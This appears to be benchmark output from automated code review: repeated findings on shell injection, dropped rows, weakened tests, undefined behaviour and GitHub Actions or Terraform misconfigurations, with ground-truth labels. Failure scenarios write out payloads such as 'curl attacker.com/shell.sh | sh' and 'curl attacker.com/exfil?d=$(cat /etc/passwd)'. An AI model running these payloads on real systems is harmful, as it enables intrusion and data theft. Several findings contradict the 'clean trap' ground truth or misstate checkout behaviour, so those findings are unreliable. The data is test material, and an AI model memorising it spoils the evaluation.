findings.body: The userName parameter is interpolated directly into a shell command string passed to execSync. Unlike the previous spawnSync call which passed arguments as a separate array (preventing shell interpretation), execSync with a string argument invokes a shell, so any shell metacharacters in userName (e.g., `; rm -rf /`, `$(malicious)`, backticks) will be executed. This is a classic command injection vulnerability.
findings.failure_scenario: An attacker supplies a userName like `alice; curl attacker.com/shell.sh | sh` — the shell interprets the semicolon and executes the injected command, leading to arbitrary code execution on the host.
findings.title: Command injection via unsanitized userName in execSync

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands (e.g., `user = "alice; rm -rf /"`). The original code used `Command::new("report").args(["--user", user])` which safely passes the argument without shell interpretation.
findings.failure_scenario: An attacker supplies a `user` value like `"alice; curl attacker.com/shell.sh | sh"`. The shell interprets the semicolon and executes the injected command, leading to remote code execution on the host.
findings.title: OS command injection via shell interpolation of user input

findings.body: The original code returned all rows unchanged. The new code calls `.skip(1)` which discards the first element of the input vector. This is a data-loss bug: the caller loses the first row of every report.
findings.failure_scenario: A caller passes `vec!["header", "row1", "row2"]` and receives `vec!["row1", "row2"]` instead of the full set, silently losing the first row.

findings.body: The test was changed from asserting exact equality of the returned rows to merely checking that the result is non-empty. The new code path `rows.into_iter().skip(1).collect()` drops the first row, so the test should verify that the first row is actually skipped. The current assertion `!result.is_empty()` would pass even if the function returned the wrong rows entirely, making it a weak test that does not validate the new behavior.
findings.failure_scenario: If the `skip(1)` logic is accidentally removed or changed, the test would still pass as long as at least one row is returned, failing to catch the regression.
findings.title: Test weakened: assertion no longer verifies row content

findings.body: The user-supplied `user` string is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` parameter can inject arbitrary shell commands (e.g., `user = "alice; rm -rf /"`). The original code used `Command::new("report").args(["--user", user])` which safely passes the user as a single argument without shell interpretation. The spec explicitly requires: "Report commands shall pass user names as arguments without a shell."
findings.failure_scenario: An attacker passes a user name like `alice; curl attacker.com/exfil?d=$(cat /etc/passwd)` — the shell executes the injected commands, leading to arbitrary code execution on the host.
findings.title: Shell injection via unsanitized user input

findings.body: std::mem::uninitialized() is deprecated since Rust 1.39 and is fundamentally unsafe: it creates a value of type T without initializing any of its bytes. For types like UserRecord that contain pointers, strings, or other non-plain-old-data, reading from this uninitialized value is undefined behavior. Even if UserRecord is a simple struct, the pattern is fragile and will break if the type ever gains a Drop impl or non-POD fields. The modern replacement is std::mem::MaybeUninit, or simply constructing the value directly.
findings.failure_scenario: If UserRecord contains any field that is not a plain-old-data type (e.g., a String, Vec, or a type with a Drop impl), reading from the uninitialized memory is undefined behavior — the program may crash, corrupt memory, or exhibit other unpredictable behavior. Even for POD types, the pattern is a footgun that will break silently if the type evolves.
findings.title: Remove use of std::mem::uninitialized()

findings.body: The `user` parameter is interpolated directly into a shell command string that is passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands. The original code used `Process.run('report', ['--user', user])` which safely passes `user` as a discrete argument without shell interpretation. The new code removes that protection by routing through a shell.
findings.failure_scenario: An attacker supplies a `user` value like `alice; rm -rf /` or `alice$(curl attacker.com/shell.sh | sh)`. The shell interprets the injected commands, leading to arbitrary code execution on the host.
findings.title: OS command injection via unsanitized user input in shell command

findings.body: `rows.sublist(1)` removes the first element from the returned list. If `rows` is empty, `sublist(1)` throws a RangeError. If `rows` has exactly one element, it returns an empty list. The stated intent is to 'preserve report rows for named users', but this change discards the first row, contradicting that intent.
findings.failure_scenario: When `rows` is an empty list, `rows.sublist(1)` throws a RangeError at runtime, crashing the function. When `rows` has one element, the caller receives an empty list instead of the expected row.
findings.title: sublist(1) drops the first row and can throw on empty/single-element lists

findings.body: The commit message states 'preserve report rows for named users', but the test was changed from asserting the exact returned rows (['first', 'second']) to merely checking isNotNull. findings.title: Test weakened from exact match to isNotNull, contradicting stated intent

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. The original code used `Process.run('report', ['--user', user])` which safely passes `user` as a single argument without shell interpretation.

findings.body: The `trim().toLowerCase()` transformation is applied to `userId` before it is used as a parameterized query value. This is a needless transformation (ponytail) unless the database column is known to store lowercased/trimmed values. If the `id` column stores the original value (e.g., mixed-case or with whitespace), this normalization will cause the query to return no rows for valid IDs. If the column does store normalized values, the normalization should be done at the write path, not at every read. Either way, this adds a correctness risk and a small per-call cost with no clear benefit.
findings.failure_scenario: A user with ID '  Admin123 ' (with leading space) is stored in the database. The query normalizes it to 'admin123', which does not match the stored value, so the user is not found.
findings.suggestion: return db.query('SELECT * FROM users WHERE id = ?', [userId]);
findings.title: Remove unnecessary normalization of userId before query

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The method signature changed from `User fetch(String id, Integer timeoutMs)` to `Map.Entry<User, Integer> fetch(String id, int timeoutMs)`. This breaks every existing caller that expects a `User` return value. The commit message says 'preserve UserClient caller compatibility' but this change does the exact opposite — it changes the return type, the parameter type (Integer → int), and the semantics entirely.
findings.failure_scenario: Any existing caller invoking `UserClient.fetch(id, timeout)` and assigning the result to a `User` variable will fail to compile. The return type is now `Map.Entry<User, Integer>` instead of `User`.
findings.title: Return type changed from User to Map.Entry<User, Integer>, breaking all callers

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: The `User` constructor is called with `new Date().toGMTString()` instead of the timeout value. The old code passed `timeoutMs` (or the default 30000) as the second argument. This changes the semantic meaning of what the User object holds — it now stores a date string where it previously stored a timeout integer. This is a correctness bug: the User object no longer carries the timeout information it was designed to hold.
findings.failure_scenario: Any code that reads the timeout field from the returned User object will now get a date string (or a type mismatch/crash) instead of the expected integer timeout value.
findings.title: User constructor now receives a Date string instead of a timeout value

findings.failure_scenario: The file will fail to compile because `Map` is not imported.
findings.title: Missing import for Map

findings.body: The combination of `pull_request_target` and checking out the PR head SHA (`ref: ${{ github.event.pull_request.head.sha }}`) is a well-known GitHub Actions security vulnerability. `pull_request_target` runs with the repository's secrets and permissions in the context of the base repository, while checking out the PR head means executing code from the fork. This allows a malicious PR to inject arbitrary code that runs with access to `secrets.RELEASE_TOKEN` and any other secrets available to the workflow. The `npm test` step will execute whatever is in the PR's `package.json` `test` script, which an attacker controls.

findings.body: actions/labeler@v6 is a third-party action referenced by a mutable tag. A mutable tag can be moved to a malicious commit, allowing an attacker to execute arbitrary code in the CI environment. Pin the action to a full commit SHA with a comment for the tag.
findings.failure_scenario: An attacker with write access to the actions/labeler repository (or a compromised maintainer) pushes a malicious commit and moves the v6 tag to it. The next workflow run checks out the malicious code and executes it with the workflow's permissions.
findings.title: Pin third-party action to a commit SHA

findings.body: The workflow is triggered by `pull_request_target` and checks out the PR head via `actions/checkout@v4`. With `pull_request_target`, the workflow runs in the context of the base repository with its secrets and permissions. Checking out the PR head (the default behavior of `actions/checkout@v4` when triggered by `pull_request_target`) means untrusted code from the PR is checked out. If any subsequent step runs scripts from the checked-out code (e.g., a `run:` step that executes a script from the repo), an attacker could inject malicious code that runs with the base repo's permissions. The `pull-requests: write` permission combined with this means a malicious PR could potentially manipulate the repository. findings.body: The variable `admin_cidr` is used directly in an ingress rule for port 22 (SSH). The validation only blocks `0.0.0.0/0`, but any other public CIDR (e.g., `0.0.0.0/1`, `1.0.0.0/8`, `8.8.8.8/32`) would still expose SSH to the internet. The validation is insufficient to prevent accidental or malicious exposure of SSH to public addresses.
findings.failure_scenario: A user sets `admin_cidr` to a public range like `0.0.0.0/1` or a specific public IP. The validation passes because it is not exactly `0.0.0.0/0`, and the security group rule opens SSH to that public range, exposing the instance to brute-force attacks and unauthorized access.
findings.title: Security group rule allows SSH from user-controlled CIDR without validation

findings.body: The validation condition only rejects the exact string "0.0.0.0/0". An admin could set admin_cidr to "0.0.0.0/1", "0.0.0.0/8", "8.8.8.8/32", or any other public IP range, which would still expose SSH (port 22) to the internet. The error message says "Admin access cannot be public" but the check does not enforce that.
findings.failure_scenario: A user sets admin_cidr to "0.0.0.0/1" (which covers half the IPv4 space including public IPs). The validation passes because it only checks for the exact string "0.0.0.0/0", and the security group rule opens SSH to a massive public range.
findings.title: Validation only blocks 0.0.0.0/0 but allows other public CIDRs

findings.body: The new variable `admin_cidr` is a public input that controls SSH access to the instance. It has no `description` field, so operators running `terraform plan` or `terraform validate` have no in-context documentation of what the value is for or what format is expected (a single CIDR block). Adding a description is the Terraform idiom for documenting variables.
findings.title: Add a description to the admin_cidr variable

ground_truth.clean_trap: The ingress CIDR became configurable, but its safe default and validation explicitly reject public admin access.
ground_truth.name: terraform-clean-context-v1

findings.body: PurePath(...).name strips directory components but does not sanitize against SQL injection or path traversal in a meaningful way for a user ID. For example, PurePath("../../etc/passwd").name returns "passwd", which is a valid string but the intent of the normalization is unclear. More critically, this does not protect against SQL injection since the query already uses a parameterized query (?). The normalization is either unnecessary (if the parameterized query is sufficient) or insufficient (if the goal is to prevent path traversal in the ID itself). If the goal is to ensure the ID is a simple filename-like token, a regex or explicit validation would be more appropriate and clearer in intent.
findings.failure_scenario: A user_id like "../../admin" becomes "admin" via PurePath, silently changing which user is looked up. Alternatively, if the intent was to prevent path traversal in a filesystem context, this normalization is applied to a SQL query where it has no protective effect, giving false confidence.
findings.title: PurePath(user_id).name is not a valid sanitization for SQL identifiers

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands. For example, a value like `alice; rm -rf /` or `$(malicious_command)` would be executed by the shell. The original code used `Command::new("report").args(["--user", user])` which safely passes the user as a single argument without shell interpretation. The change to `sh -c` with string interpolation removes that safety.
findings.failure_scenario: An attacker supplies a `user` value containing shell metacharacters (e.g., `; rm -rf /` or `$(curl attacker.com/shell.sh | sh)`). The shell interprets these as additional commands, leading to arbitrary code execution on the host.
findings.title: OS command injection via unsanitized user input in shell command

findings.body: The original code returned all rows unchanged. The new code calls `.skip(1)` which discards the first element of the input vector. This is a data-loss bug: the caller's first row is silently lost. The commit message says "preserve report rows" but the code does the opposite.
findings.failure_scenario: A caller passes `vec!["header", "row1", "row2"]` expecting all rows back. The function returns `vec!["row1", "row2"]`, silently dropping the header/first row.
findings.title: skip(1) silently drops the first row

findings.body: The original test asserted the exact output `vec!["first", "second"]`, which would have caught the regression introduced by `skip(1)` in `render_report`. The new assertion `!is_empty()` passes even when the first row is silently dropped, so the test no longer verifies the actual contract of the function. The `skip(1)` call in `lib.rs` is a behavioral change that removes the first row from the returned vector, and the test should reflect what the function is actually expected to return.
findings.failure_scenario: If `skip(1)` is a bug (e.g., the first row is data, not a header), the test will still pass because the remaining rows are non-empty, masking the data loss.
findings.title: Test weakened to only check non-emptiness, losing coverage of the skip(1) behavior

findings.body: The user-supplied `user` string is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` parameter can inject arbitrary shell commands (e.g., `user = "alice; rm -rf /"`). The original code used `Command::new("report").args(["--user", user])` which safely passes the user as a single argument without shell interpretation. The spec explicitly requires: "Report commands shall pass user names as arguments without a shell."
findings.failure_scenario: An attacker passes a user name like `alice; curl attacker.com/exfil?d=$(cat /etc/passwd)` — the shell executes the injected commands, leading to arbitrary code execution on the host.
findings.title: Shell injection via unsanitized user input

findings.body: std::mem::uninitialized() is deprecated since Rust 1.39 and is fundamentally unsafe: it creates a value of type T without initializing any of its bytes. For types like UserRecord that contain pointers, strings, or other non-plain-old-data, reading from this uninitialized value is undefined behavior. Even if UserRecord is a simple struct, the pattern is fragile and will break if the type ever gains a Drop impl or non-POD fields. The modern replacement is std::mem::MaybeUninit, or simply constructing the value directly.
findings.failure_scenario: If UserRecord contains any field that is not a plain-old-data type (e.g., a String, Vec, or a type with a Drop impl), reading from the uninitialized memory is undefined behavior — it can cause crashes, data corruption, or security vulnerabilities. Even for POD types, the compiler is free to assume the value is valid, so any read before initialization is UB.
findings.title: Remove use of std::mem::uninitialized()

findings.body: The `user` parameter is interpolated directly into a shell command string that is passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands. The original code used `Process.run('report', ['--user', user])` which safely passes `user` as a discrete argument without shell interpretation. The new code removes that protection by routing through a shell.
findings.failure_scenario: An attacker supplies a `user` value like `alice; rm -rf /` or `alice$(curl attacker.com/shell.sh | sh)`. The shell interprets the injected commands, leading to arbitrary code execution on the host.
findings.title: OS command injection via unsanitized user input in shell command

findings.body: The commit message states 'preserve report rows for named users', but `rows.sublist(1)` removes the first element from the returned list. This is a data-loss bug: the first row is silently discarded. The original code returned `rows` unchanged.
findings.failure_scenario: Any caller of renderReport receives a list missing its first element, causing downstream logic that depends on all rows to produce incorrect results.
findings.title: sublist(1) drops the first row, contradicting stated intent

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the exact returned list `['first', 'second']` to merely checking `isNotNull`. The code now calls `rows.sublist(1)`, which drops the first element, so the function returns `['second']` for the given input. The weakened assertion masks this behavioural change and would pass even if the function returned an empty list or the wrong elements. The test should assert the actual expected output to catch regressions in the row transformation.
findings.failure_scenario: A future change to `renderReport` that corrupts or drops rows would go undetected because the test only checks that the result is non-null, not that it contains the correct data.
findings.title: Test weakened to isNotNull — no longer verifies row content

findings.body: The method signature changed from `User fetch(String id, Integer timeoutMs)` to `Map.Entry<User, Integer> fetch(String id, int timeoutMs)`. This is a breaking API change: every existing caller that expects a `User` return type will fail to compile. The commit message states the intent is to 'preserve UserClient caller compatibility', but this change does the exact opposite — it fundamentally alters the return type and parameter type (Integer → int), making it impossible for existing callers to compile without modification.
findings.failure_scenario: Any existing caller invoking `UserClient.fetch(id, timeout)` and assigning the result to a `User` variable will fail to compile after this change, as the return type is now `Map.Entry<User, Integer>`. Additionally, callers passing `null` for timeout will now get a NullPointerException or compilation error since the parameter is now a primitive `int`.
findings.title: Return type changed from User to Map.Entry<User, Integer>, breaking all callers

findings.body: The user-supplied `user` parameter is concatenated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands (e.g., `user = "alice; rm -rf /"`). The original code used `exec.Command("report", "--user", user)` which safely passes `user` as a single argument without shell interpretation. The change to `sh -c` with string concatenation removes that safety.
findings.failure_scenario: An attacker supplies a `user` value like `"; curl attacker.com/shell.sh | sh"` or `"$(malicious_command)"`. The shell interprets the injected string, executing arbitrary commands with the privileges of the process.
findings.title: OS command injection via shell interpolation of user input

findings.body: The stated intent is to 'preserve report rows', but `rows[1:]` discards the first element. Additionally, if `rows` is empty (len 0), `rows[1:]` will panic with a slice bounds out of range error. The original code returned `rows` unchanged.
findings.failure_scenario: When `Render` is called with an empty slice, `rows[1:]` panics. When called with a non-empty slice, the first row is silently dropped, contradicting the stated intent to preserve rows.
findings.title: Off-by-one: rows[1:] drops the first row and panics on empty slice

findings.body: The original test verified that `Render` preserved both rows (length == 2 and first element == "first"). The new test only checks that the result is not nil, which would pass even if `Render` returned an empty slice or a slice with wrong content. This is a significant reduction in test coverage that masks the `rows[1:]` data-loss bug.
findings.failure_scenario: The `rows[1:]` change in `Render` drops the first element, but the test still passes because it only checks for non-nil. The regression is undetected.
findings.title: Test no longer verifies row content or length

findings.body: The workflow is triggered by `pull_request_target`, which runs with the base repository's permissions and secrets. The `ref` is set to `${{ github.event.pull_request.head.sha }}`, which is attacker-controlled. While the SHA itself is a git hash, the combination of `pull_request_target` with checking out the PR head means the workflow runs with elevated permissions (including `secrets.RELEASE_TOKEN`) on untrusted code. An attacker can craft a malicious PR that, when checked out and executed via `npm test`, has access to the `RELEASE_TOKEN` secret. This is a classic `pull_request_target` misconfiguration: the workflow should not check out untrusted code and then run it with access to secrets.
findings.failure_scenario: An attacker opens a pull request with a malicious `package.json` or test script. The `pull_request_target` workflow checks out the attacker's code and runs `npm test` with `RELEASE_TOKEN` available in the environment. The attacker's code exfiltrates the token, gaining access to the release infrastructure.
findings.title: Untrusted input interpolated into checkout ref enables arbitrary code execution

findings.body: The combination of `pull_request_target` and checking out the PR head SHA (`github.event.pull_request.head.sha`) is a well-known critical security vulnerability. `pull_request_target` runs with the base repository's secrets and permissions (unlike `pull_request` which runs in a sandboxed environment with no access to secrets). By checking out the untrusted PR head code and then running `npm test`, an attacker who opens a malicious PR can execute arbitrary code with full access to the repository's secrets (including `RELEASE_TOKEN`). This is the exact attack vector described in GitHub's security documentation for `pull_request_target`.
findings.failure_scenario: An attacker opens a pull request from a fork with a malicious `package.json` (e.g., a `pretest` or `postinstall` script that exfiltrates `RELEASE_TOKEN` to an external server). The workflow triggers on `pull_request_target`, checks out the attacker's code, and runs `npm test` which executes the malicious script with access to `secrets.RELEASE_TOKEN`, leading to credential theft and potential repository compromise.
findings.title: pull_request_target with head SHA checkout enables arbitrary code execution from fork PRs

findings.body: The workflow is changed from `pull_request` to `pull_request_target`, which runs in the context of the base repository and has access to secrets. However, `actions/checkout@v4` without a `ref` argument checks out the PR head commit (the untrusted code from the fork). This means untrusted code from a fork is checked out in a workflow that has `pull-requests: write` permission and access to the base repo's secrets. If the checked-out code contains malicious workflow files or if the labeler action is somehow influenced, this could be exploited. More critically, `actions/labeler@v6` reads a configuration file (typically `labeler.yml`) from the checked-out repository — meaning an attacker in a fork could supply a malicious `labeler.yml` that controls how labels are applied, potentially manipulating PR labels in the base repository.
findings.failure_scenario: A malicious contributor opens a PR from a fork containing a crafted `labeler.yml` file. Because the workflow uses `pull_request_target` (which has access to base repo secrets and runs with the base repo's permissions) and `actions/checkout@v4` checks out the PR head (untrusted code), the `actions/labeler@v6` action reads the attacker-controlled `labeler.yml` and applies labels according to the attacker's rules, potentially manipulating PR state in the base repository.
findings.title: pull_request_target with checkout@v4 checks out PR head, enabling code execution

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

While there is a validation that rejects `0.0.0.0/0`, the variable accepts any other CIDR block, including overly broad ranges like `0.0.0.0/1` or `10.0.0.0/8`. The validation only blocks the exact string `0.0.0.0/0`, which is trivially bypassed by using a different representation of the same or broader range. An attacker or misconfigured deployment could set this to a very broad CIDR, exposing SSH to a large address space.
findings.failure_scenario: A user or CI pipeline sets `admin_cidr` to `0.0.0.0/1` (which covers half the IPv4 space) or `10.0.0.0/8` (an entire RFC 1918 range). The validation passes because the value is not exactly `0.0.0.0/0`, and the security group rule opens SSH to that broad range, potentially exposing the instance to unauthorized access.
findings.title: Security group rule allows SSH from user-controlled CIDR without validation

findings.body: The old code used `datetime.now(UTC)` which returns a timezone-aware UTC datetime. The new code uses `datetime.utcnow()` which is deprecated since Python 3.12 and returns a naive (timezone-unaware) datetime. This is a correctness regression: any downstream code that compares or serializes this timestamp will now get a naive datetime instead of an aware one, which can cause `TypeError` when mixed with aware datetimes or produce incorrect results in timezone-sensitive logic.
findings.failure_scenario: Any code that compares `fetched_at` with a timezone-aware datetime (e.g., `datetime.now(UTC)`) will raise TypeError: can't compare offset-naive and offset-aware datetimes. Serialization to ISO format will also lose the timezone offset, making the timestamp ambiguous.
findings.title: datetime.utcnow() is deprecated and returns a naive datetime

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit message states 'keep fetch_user backward compatible', but the return type has changed from `dict[str, object]` to `tuple[dict[str, object], int]`. Any existing caller that does `result = fetch_user(...)` and then accesses `result['id']` or `result['fetched_at']` will now get a TypeError because a tuple is not subscriptable by string keys. This directly contradicts the stated intent.
findings.failure_scenario: Any existing caller that unpacks the return value as a dict (e.g., `user = fetch_user('123'); print(user['id'])`) will raise TypeError: tuple indices must be integers or slices, not str.
findings.title: Return type changed from dict to tuple, breaking backward compatibility

For example, a value like `alice; rm -rf /` or `alice$(curl attacker.com)` would execute arbitrary commands on the host. The previous code using `spawnSync` with an argument array was safe because it did not invoke a shell.
findings.failure_scenario: An attacker supplies a crafted `userName` value such as `alice; curl http://attacker.com/shell.sh | sh`. The `execSync` call invokes `/bin/sh -c 'report --user alice; curl http://attacker.com/shell.sh | sh'`, executing the attacker's payload on the server.

findings.body: The test was changed from toEqual(["first", "second"]) to toBeDefined(). The function now calls rows.slice(1), which drops the first element, so the returned value is ["second"]. The new assertion only checks that the result is defined, which would pass even if the function returned an empty array, undefined (well, toBeDefined would fail on undefined), or any other value. This means the test no longer verifies the actual behavior of the function — specifically that it returns the rows minus the first element. A regression in the slice logic would not be caught.
findings.failure_scenario: If the slice(1) logic is accidentally changed to slice(0) or the function is refactored to return an empty array, the test still passes because toBeDefined() only checks that the result is not undefined.
findings.title: Test assertion weakened to toBeDefined, no longer verifies returned rows

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands (e.g., `user = "alice; rm -rf /"`). The original code used `Command::new("report").args(["--user", user])` which safely passes the argument without shell interpretation.
findings.failure_scenario: An attacker supplies a `user` value like `"alice; curl attacker.com/shell.sh | sh"`. The shell interprets the semicolon and executes the injected command, leading to remote code execution on the host.

findings.body: The original code returned all rows unchanged. The new code calls `.skip(1)` which discards the first element of the input vector. This is a data-loss bug: the caller loses the first row of every report.
findings.failure_scenario: A caller passes `vec!["header", "row1", "row2"]` and receives `vec!["row1", "row2"]` instead of the full set, silently losing the first row.

findings.body: The test was changed from asserting exact equality of the returned rows to merely checking that the result is non-empty. The new code path `rows.into_iter().skip(1).collect()` drops the first row, so the test should verify that the first row is actually skipped. The current assertion `!result.is_empty()` would pass even if the function returned the wrong rows entirely, making it a weak test that does not validate the new behavior.
findings.failure_scenario: If the `skip(1)` logic is accidentally removed or changed, the test would still pass as long as at least one row is returned, failing to catch the regression.
findings.title: Test weakened: assertion no longer verifies row content

findings.body: The user-supplied `user` string is interpolated directly into a shell command string passed to `sh -c`. An attacker who controls the `user` parameter can inject arbitrary shell commands (e.g., `user = "alice; rm -rf /"`). The original code used `Command::new("report").args(["--user", user])` which safely passes the user as a single argument without shell interpretation. The spec explicitly requires: "Report commands shall pass user names as arguments without a shell."
findings.failure_scenario: An attacker passes a user name like `alice; curl attacker.com/exfil?d=$(cat /etc/passwd)` — the shell executes the injected commands, leading to arbitrary code execution on the host.
findings.title: Shell injection via unsanitized user input

findings.body: std::mem::uninitialized() creates a value of type UserRecord without initializing its fields. If UserRecord contains any type that is not valid in an uninitialized state (e.g., bool, enum, reference, or any type with invariants), reading or dropping it is undefined behavior. Even if UserRecord is a simple struct of integers, the act of creating an uninitialized value and passing it to UserRecord::merge is UB if merge reads any field before writing it. In modern Rust, std::mem::uninitialized() is deprecated and should be replaced with std::mem::MaybeUninit or by constructing the value properly.
findings.failure_scenario: If UserRecord contains a bool, enum, or any type with validity invariants, the uninitialized memory may contain a bit pattern that is not a valid value of that type. When UserRecord::merge reads the scratch value, it reads invalid data, causing undefined behavior — potential crashes, data corruption, or security vulnerabilities.
findings.title: Use of std::mem::uninitialized() is undefined behavior

findings.body: The `user` parameter is interpolated directly into a shell command string that is passed to `sh -c`. An attacker who controls the `user` value can inject arbitrary shell commands. The original code used `Process.run('report', ['--user', user])` which safely passes `user` as a discrete argument without shell interpretation. The new code removes that protection by routing through a shell.
findings.failure_scenario: An attacker supplies a `user` value like `alice; rm -rf /` or `alice$(curl attacker.com/shell.sh | sh)`. The shell interprets the injected commands, leading to arbitrary code execution on the host.
findings.title: OS command injection via unsanitized user input in shell command

findings.body: The commit message states 'preserve report rows for named users', but `rows.sublist(1)` removes the first element from the list. This is a data-loss bug: the first row is silently discarded on every call. If `rows` is empty, `sublist(1)` throws a RangeError.
findings.failure_scenario: Every call to renderReport loses the first row of data. If rows is an empty list, a RangeError is thrown at runtime.
findings.title: sublist(1) drops the first row, contradicting stated intent

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the exact returned list `['first', 'second']` to merely checking `isNotNull`. The code now calls `rows.sublist(1)`, which drops the first element, so the function returns `['second']` for the given input. The weakened assertion masks this behavioural change and would pass even if the function returned an empty list or the wrong elements. The test should assert the actual expected output to catch regressions in the row transformation.
findings.failure_scenario: A future change to `renderReport` that corrupts or drops rows would go undetected because the test only checks that the result is non-null, not that it contains the correct data.
findings.title: Test weakened to isNotNull — no longer verifies row content

findings.body: The user-supplied `user` parameter is concatenated directly into a shell command string passed to `/bin/sh -c`. An attacker can supply a value like `alice; rm -rf /` or `alice$(malicious)` to execute arbitrary commands. The original code using `ProcessBuilder` with separate arguments was safe from injection because each argument was passed as a discrete token. The new code introduces a shell interpretation layer that makes the input a command injection vector.
findings.failure_scenario: An attacker passes a `user` value containing shell metacharacters (e.g., `alice; curl attacker.com/shell.sh | sh`). The shell interprets the semicolon and executes the injected command, leading to remote code execution on the host.

findings.body: The method now returns `rows.subList(1, rows.size())` instead of `rows`. This silently discards the first element of the list. Additionally, if `rows` is empty, `subList(1, 0)` throws `IllegalArgumentException` (fromIndex > toIndex). The stated intent is to 'preserve report rows', but this change removes the first row, contradicting that intent.
findings.failure_scenario: When `rows` is an empty list, `subList(1, 0)` throws IllegalArgumentException because fromIndex (1) is greater than toIndex (0). When `rows` has one or more elements, the first row is silently dropped, so callers receive fewer rows than expected.
findings.title: subList(1, ...) drops the first row and can throw IndexOutOfBoundsException

findings.body: The test was changed from asserting the exact list content (`assertEquals(List.of("first", "second"), ...)`) to merely asserting non-null (`assertNotNull(...)`). findings.failure_scenario: The `subList(1, ...)` bug silently drops the first row, but the weakened test passes because it only checks the result is non-null. The regression goes undetected.
findings.title: Test weakened from assertEquals to assertNotNull, hiding the row-dropping bug

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The method signature changed from `User fetch(String id, Integer timeoutMs)` to `Map.Entry<User, Integer> fetch(String id, int timeoutMs)`. This is a breaking API change: every existing caller that expects a `User` return type will fail to compile. The commit message states 'preserve UserClient caller compatibility', but this change does the exact opposite — it fundamentally alters the return type and the parameter type (Integer → int, removing null-safety).
findings.failure_scenario: Any existing caller invoking `UserClient.fetch(id, timeout)` and assigning the result to a `User` variable will fail to compile after this change, breaking all downstream code that depends on the stable User return contract.
findings.title: Return type changed from User to Map.Entry<User, Integer>, breaking all callers

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: The old code passed `timeoutMs` (an Integer) as the second argument to the `User` constructor. The new code passes `new Date().toGMTString()` instead. This changes the semantic meaning of the second constructor parameter from a timeout value to a date string, which is almost certainly a bug — the User object will now carry a date string where it previously carried a timeout integer.
findings.failure_scenario: Any code that reads the second field of User expecting a timeout integer will now receive a date string, causing ClassCastException or incorrect behavior at runtime.
findings.title: User constructor now receives a Date string instead of a timeout value

findings.body: The new code uses `Map.Entry` and `Map.entry()` but only `java.util.Date` is imported. `java.util.Map` is not imported, which will cause a compilation error.
findings.failure_scenario: The file will fail to compile because `Map` is not in scope — neither `Map.Entry` nor `Map.entry()` can be resolved without an import of `java.util.Map`.
findings.title: Missing import for java.util.Map

findings.body: The workflow uses `pull_request_target` which runs in the context of the base repository with access to its secrets. The checkout step checks out the PR head SHA (`github.event.pull_request.head.sha`), which is attacker-controlled code from a fork. This means an attacker can submit a PR that modifies the workflow file itself (or any other file) to execute arbitrary code with access to the repository's secrets (including `RELEASE_TOKEN`). The `pull_request_target` event type is specifically designed for workflows that need to run on PRs from forks while still having access to secrets, but it requires extreme care to ensure that no untrusted code is executed. By checking out the PR head, the workflow executes the attacker's code in a context where it has access to the base repo's secrets.
findings.failure_scenario: An attacker submits a PR to the repository. The `pull_request_target` event triggers the workflow in the base repo context. The checkout step checks out the attacker's code (the PR head SHA). If the attacker has modified the workflow file or any script that `npm test` runs, their code executes with access to `secrets.RELEASE_TOKEN` and any other secrets available to the workflow. This allows the attacker to exfiltrate the release token and potentially compromise the release pipeline.
findings.title: Arbitrary code execution via pull_request_target with untrusted checkout

findings.body: The combination of `pull_request_target` and checking out the PR head SHA (`github.event.pull_request.head.sha`) is a well-known GitHub Actions security vulnerability. `pull_request_target` runs with the base repository's permissions and secrets (unlike `pull_request` which runs in a fork context with no access to secrets). By checking out the untrusted PR head code and then running `npm test`, an attacker can execute arbitrary code with full access to the repository's secrets. The `RELEASE_TOKEN` secret is explicitly exposed to this untrusted code via the `env` block, making it directly exfiltrable.
findings.failure_scenario: A malicious contributor opens a PR with a crafted `package.json` (e.g., a `pretest` or `postinstall` script) that exfiltrates `RELEASE_TOKEN` to an external server. Because `pull_request_target` runs in the base repo context with secrets available, and the checkout uses the attacker-controlled head SHA, the malicious script executes with full secret access.
findings.title: pull_request_target with head SHA checkout enables arbitrary code execution from fork PRs

expected.label: pull_request_target executes untrusted head with a secret

findings.body: actions/labeler@v6 is a third-party action referenced by a mutable tag. A mutable tag can be moved to a malicious commit, allowing an attacker to execute arbitrary code in the CI environment. Pin the action to a full commit SHA with a comment for the tag.
findings.failure_scenario: An attacker with write access to the actions/labeler repository (or a compromised maintainer) pushes a malicious commit and moves the v6 tag to it. The next workflow run checks out the malicious code and executes it with the workflow's permissions.
findings.title: Pin third-party action to a commit SHA

findings.body: The workflow is triggered by `pull_request_target` and checks out the PR head via `actions/checkout@v4`. With `pull_request_target`, the workflow runs in the context of the base repository with its secrets and permissions. Checking out the PR head (the default behavior of `actions/checkout@v4` when triggered by `pull_request_target`) means untrusted code from the PR is checked out. If any subsequent step runs scripts from the checked-out code (e.g., a `run:` step that executes a script from the repo), an attacker could inject malicious code that runs with the base repo's permissions. The `pull-requests: write` permission combined with this means a malicious PR could potentially manipulate the repository. The safe pattern is to either use `pull_request` (which runs in a sandboxed environment without base-repo secrets) or to explicitly check out the base ref with `ref: ${{ github.base_ref }}` when using `pull_request_target`.
